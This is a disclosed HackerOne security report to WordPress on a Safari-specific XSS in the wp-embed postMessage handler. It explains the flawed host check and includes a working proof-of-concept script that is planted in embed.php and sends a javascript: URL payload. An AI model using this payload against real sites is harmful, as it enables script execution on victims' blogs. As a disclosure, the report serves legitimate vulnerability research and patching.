# wp-embed XSS on Safari

## Report Details
- **Report ID**: 1238528
- **URL**: https://hackerone.com/reports/1238528
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-20T02:26:46.395Z
- **Disclosed**: 2023-07-01T11:34:07.022Z

## Reporter
- **Username**: zoczus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hello! I'd like to report an XSS vulberability which works only on Safari browser (and maybe on others which I didn't checked. It defo doesn't work on both Chrome and Firefox). The other requirement which need to be met is attacker's blog post being embed on destination (victim) blog. 

## Analysis

Let's take a look to the core of problem - JavaScript postMessage handler: 

```javascript
     if (c.wp.receiveEmbedMessage = function(e) {
            var t = e.data;
            if (t)
                if (t.secret || t.message || t.value)
                    if (!/[^a-zA-Z0-9]/.test(t.secret)) {
                        for (var r, a, i, s = d.querySelectorAll('iframe[data-secret="' + t.secret + '"]'), n = d.querySelectorAll('blockquote[data-secret="' + t.secret + '"]'), o = 0; o < n.length; o++)
                            n[o].style.display = "none";
                        for (o = 0; o < s.length; o++)
                            if (r = s[o],
                            e.source === r.contentWindow) {
                                if (r.removeAttribute("style"),
                                "height" === t.message) {
                                    if (1e3 < (i = parseInt(t.value, 10)))
                                        i = 1e3;
                                    else if (~~i < 200)
                                        i = 200;
                                    r.height = i
                                }
                                if ("link" === t.message)
                                    if (a = d.createElement("a"),
                                    i = d.createElement("a"),
                                    a.href = r.getAttribute("src"),
                                    i.href = t.value,
                                    i.host === a.host)
                                        if (d.activeElement === r)
                                            c.top.location.href = t.value
                            }
                    }
        }
```

Things need to be noticed: 

- Secret need to be known (but it's provided as location.hash of embed webpage, so it's not a problem)
- Only content window can send postMessages (which is cool, as it's attacker website)
- If **message** attribute of postMessage data has `link` value - crazy things are happening
- most important ```c.top.location.href = t.value``` where `t` is postMessage data controlled by attacker. 

The last point obviously can lead to XSS if attacker will use ```javascript:alert(document.domain)``` as `t.value`, however - before it happen important check is made:

```javascript
     if (a = d.createElement("a"),
                                    i = d.createElement("a"),
                                    a.href = r.getAttribute("src"),
                                    i.href = t.value,
                                    i.host === a.host)
```

This code checks if **hostname** provided in ```t.value``` is the same as **hostname** of embed page. It create `<a>` element, but `t.value` as `href` attribute and then - takes `host` attribute of created URL. This approach is of course way better than some regexp magic ;-) but there's a behavior specific in Safari browser:

```
> var a = document.createElement("a")
> a.href="javascript://google.com/%0aalert(document.domain);//"
> console.log(a.host)
< google.com
```

All other browsers return empty string in case of using `javascript:` scheme, but not Safari. :) This could lead attacker to use `javascript` schema and execute javascript code in top window (victim's blog)


## Steps To Reproduce:

1. Get evil wordpress instance ;-) 
2. Edit `wordpress/wp-includes/theme-compat/embed.php` file and add your custom HTML code:

```html
<script>
if(document.location.hash.indexOf("secret") != -1) {
  secret = document.location.hash.split("=")[1];
  window.top.postMessage({"secret":secret,"message":"link","value":"javascript://"+document.location.host+"/%0aalert(document.domain);//"},"*");
}
</script>
```
3. Create any post on attacker blog, publish it and get it's URL.
4. On victim wordpress site (Safari) add new post with embed post from victim wordpress
5. Alert executed. :) 

Sample blogpost that can be embedded: `https://ropchain.org/lab/wordpress/2021/06/20/embed-me/`

## Recommendations

It's recommended to also validate schema of links and allow only HTTP / HTTPS links in postMessages.

## Impact

Ability to execute JavaScript code on wordpress page which embeded attacker's blogpost. 

Please assign CVE identifier to this vulnerability. While crediting it, please use:

*Jakub Żoczek, Senior Security Researcher @ Securitum [https://securitum.pl/](https://securitum.pl/)*

All the best!

## Attachments
No attachments
